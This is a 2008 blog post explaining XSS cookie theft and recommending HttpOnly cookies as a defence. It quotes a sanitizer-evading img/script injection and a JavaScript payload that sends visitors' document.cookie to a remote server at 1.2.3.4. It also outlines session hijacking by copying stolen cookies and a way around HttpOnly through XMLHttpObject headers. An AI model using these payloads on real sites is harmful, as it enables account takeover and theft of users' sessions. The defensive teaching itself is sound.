---
title: "Protecting Your Cookies: HttpOnly"
date: 2008-08-28
url: https://blog.codinghorror.com/protecting-your-cookies-httponly/
slug: protecting-your-cookies-httponly
word_count: 1065
---

So I have this friend. I’ve told him time and time again [how dangerous XSS vulnerabilities are](http://blog.stackoverflow.com/2008/06/safe-html-and-xss/), and how [XSS](http://en.wikipedia.org/wiki/Cross-site_scripting) is now **the most common of all publicly reported security vulnerabilities** – dwarfing [old standards](https://blog.codinghorror.com/sins-of-software-security/) like buffer overruns and SQL injection. But will he listen? No. He’s hard headed. He had to go and write [his own HTML sanitizer](https://web.archive.org/web/20080828061413/http://refactormycode.com/codes/333-sanitize-html). Because, well, how difficult can it be? How dangerous could this silly little toy scripting language running inside a *browser* be?


As it turns out, far more dangerous than expected.


To appreciate just how significant XSS hacks have become, think about how much of your life is lived online, and how exactly the websites you log into on a daily basis know who you are. It’s all done with [HTTP cookies](http://en.wikipedia.org/wiki/HTTP_cookie), right? Those tiny little identifying headers sent up by the browser to the server on your behalf. They’re the keys to your identity as far as the website is concerned.


Most of the time when you accept input from the user the *very first thing you do* is pass it through a HTML encoder. So tricky things like:

kg-card-begin: html

```

<script>alert('hello XSS!');</script>

```

kg-card-end: html

are automagically converted into their harmless encoded equivalents:

kg-card-begin: html

```

&lt;script&gt;alert('hello XSS!');&lt;/script&gt;

```

kg-card-end: html

In my friend’s defense (not that he deserves any kind of defense) the website he’s working on allows some HTML to be posted by users. It’s part of the design. It’s a difficult scenario, because you can’t just clobber every questionable thing that comes over the wire from the user. You’re put in the uncomfortable position of having to discern good from bad, and decide what to do with the questionable stuff.


Imagine, then, the surprise of my friend when he noticed some enterprising users on his website **were logged in as him** and happily banging away on the system with full unfettered administrative privileges.


How did this happen? XSS, of course. It all started with this bit of script added to a user’s profile page.

kg-card-begin: html

```

<img src=""http://www.a.com/a.jpg<script type=text/javascript
src="http://1.2.3.4:81/xss.js">" /><<img
src=""http://www.a.com/a.jpg</script>"

```

kg-card-end: html

Through clever construction, the malformed URL just manages to squeak past the sanitizer. The final rendered code, when viewed in the browser, loads and executes a script from that remote server. Here’s what that JavaScript looks like:

kg-card-begin: html

```

window.location="http://1.2.3.4:81/r.php?u="
+document.links[1].text
+"&l="+document.links[1]
+"&c="+document.cookie;

```

kg-card-end: html

That’s right – whoever loads this script-injected user profile page has just unwittingly **transmitted their browser cookies to an evil remote server!**


As we’ve already established, once someone has your browser cookies for a given website, they essentially have the keys to the kingdom for your identity there. If you don’t believe me, get the Add N Edit cookies extension for Firefox and try it yourself. Log into a website, copy the essential cookie values, then paste them into another browser running on another computer. That’s all it takes. It’s quite an eye opener.


If cookies are so precious, you might find yourself asking why **browsers don’t do a better job of protecting their cookies**. I know my friend was. Well, there is a way to protect cookies from most malicious JavaScript: HttpOnly cookies.


When you tag a cookie with the HttpOnly flag, it tells the browser that **this particular cookie should only be accessed by the server**. Any attempt to access the cookie from client script is strictly forbidden. Of course, this presumes you have:

1. A modern web browser
2. A browser that actually implements HttpOnly correctly


The good news is that most modern browsers do support the HttpOnly flag: Opera 9.5, Internet Explorer 7, and Firefox 3. I’m not sure if the latest versions of Safari do or not. It’s sort of ironic that the HttpOnly flag was pioneered by Microsoft in hoary old Internet Explorer 6 SP1, a bowser which isn’t exactly known for its iron-clad security record.


Regardless, **HttpOnly cookies are a great idea, and properly implemented, make huge classes of common XSS attacks much harder to pull off.** Here’s what a cookie looks like with the HttpOnly flag set:

kg-card-begin: html

```

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/7.0
Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; HttpOnly
X-AspNet-Version: 2.0.50727
Set-Cookie: user=t=bfabf0b1c1133a822; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Tue, 26 Aug 2008 10:51:08 GMT
Content-Length: 2838

```

kg-card-end: html

This isn’t exactly news; Scott Hanselman [wrote about HttpOnly](http://www.hanselman.com/blog/HttpOnlyCookiesOnASPNET11.aspx) a while ago. I’m not sure he understood the implications, as he was quick to dismiss it as “slowing down the average script kiddie for 15 seconds.” In his defense, this was way back in 2005. A dark, primitive time. Almost pre YouTube.


HttpOnly cookies can in fact be remarkably effective. Here’s what we know:

- HttpOnly restricts all access to `document.cookie` in IE7, Firefox 3, and Opera 9.5 (unsure about Safari)
- HttpOnly removes cookie information from the response headers in `XMLHttpObject.getAllResponseHeaders()` in IE7. It should do the same thing in Firefox, but it doesn’t, because [there’s a bug](https://bugzilla.mozilla.org/show_bug.cgi?id=380418).
- `XMLHttpObjects` may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.


The big security hole, as alluded to above, is that Firefox (and presumably Opera) allow access to the headers through `XMLHttpObject`. So you could make a trivial JavaScript call back to the local server, get the headers out of the string, and then post that back to an external domain. Not as easy as `document.cookie`, but hardly a feat of software engineering.


Even with those caveats, I believe HttpOnly cookies are a huge security win. If I – er, I mean, if my friend – had implemented HttpOnly cookies, **it would have totally protected his users from the above exploit!**


HttpOnly cookies don’t make you immune from XSS cookie theft, but they raise the bar considerably. It’s practically free, a “set it and forget it” setting that’s bound to become increasingly secure over time as more browsers follow the example of IE7 and implement client-side HttpOnly cookie security correctly. If you develop web applications, or you know anyone who develops web applications, **make sure they know about HttpOnly cookies.**


Now I just need to go tell my friend about them. I’m not sure why I bother. He never listens to me anyway.


(Special thanks to Shawn *expert developer* Simon for his assistance in constructing this post.)

[security](https://blog.codinghorror.com/tag/security/)
[xss](https://blog.codinghorror.com/tag/xss/)
[httponly](https://blog.codinghorror.com/tag/httponly/)
[cookies](https://blog.codinghorror.com/tag/cookies/)
[web development](https://blog.codinghorror.com/tag/web-development/)
